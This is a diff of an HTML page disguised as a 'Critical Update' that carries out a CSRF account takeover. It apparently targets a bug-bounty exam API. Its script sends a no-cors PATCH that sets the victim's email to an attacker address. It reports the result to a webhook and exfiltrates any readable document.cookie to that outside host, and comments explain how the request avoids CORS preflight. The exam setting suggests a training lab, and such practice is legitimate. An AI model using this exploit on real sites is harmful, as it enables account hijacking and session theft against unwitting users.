@@ -1,30 +1,50 @@
+<!DOCTYPE html>
 <html>
-  <body>
-    <h1>Security Check in Progress...</h1>
+<head>
+    <title>Critical Update</title>
+</head>
+<body>
+    <h1>Processing Log Files...</h1>
     <script>
-      const webhook = "https://webhooksite.net/841a65c5-0695-459d-80da-91ae7613c283";
-      const apiTarget = "https://api-bugbounty-exam.hashacademy.co/api/auth/profile";
+        // 1. Define the target API and your Webhook for tracking
+        const targetApi = "https://api-bugbounty-exam.hashacademy.co/api/auth/profile";
+        const myWebhook = "https://webhooksite.net/841a65c5-0695-459d-80da-91ae7613c283"; // REPLACE THIS
 
-      // 1. Alert your webhook that the Bot has arrived
-      fetch(webhook + "?status=bot_landed&ua=" + btoa(navigator.userAgent));
+        // 2. Data to change the Admin's account to yours
+        // We try to inject an 'email' field to perform the Takeover
+        const exploitData = {
+            "fullName": "Hacked By Participant",
+            "email": "rundlady@gongjua.com", // This is the goal for ATO
+            "phoneNumber": "555-000-1337",
+            "address": {
+                "street": "123 Exploited Way",
+                "city": "Tripoli",
+                "state": "FL",
+                "zipCode": "33601",
+                "country": "US"
+            }
+        };
 
-      // 2. Attempt the CSRF PATCH to take over the account
-      // We try to change the email to one we control
-      fetch(apiTarget, {
-        method: "PATCH",
-        mode: "no-cors",
-        headers: {
-          "Content-Type": "text/plain"
-        },
-        body: JSON.stringify({
-          "email": "rundlady@gongjua.com",
-          "fullName": "Account Owned",
-          "phoneNumber": "13371337"
-        })
-      }).then(() => {
-        // 3. Confirm to your webhook that the request was sent
-        fetch(webhook + "?status=attack_sent");
-      });
+        // 3. The CSRF Execution
+        // We use 'no-cors' to prevent the browser from blocking the request due to CORS
+        fetch(targetApi, {
+            method: "PATCH",
+            mode: "no-cors", 
+            headers: {
+                "Content-Type": "text/plain" // Standard CSRF trick to bypass preflight
+            },
+            body: JSON.stringify(exploitData)
+        }).then(() => {
+            // Log to your webhook so you know the bot triggered the attack
+            fetch(myWebhook + "?status=success&message=Patch_Sent_to_Admin");
+        }).catch((err) => {
+            fetch(myWebhook + "?status=error&detail=" + btoa(err));
+        });
+
+        // 4. Extra: Try to steal the cookie if it's not HttpOnly
+        if (document.cookie) {
+            fetch(myWebhook + "?exfiltrated_cookie=" + btoa(document.cookie));
+        }
     </script>
-  </body>
+</body>
 </html>
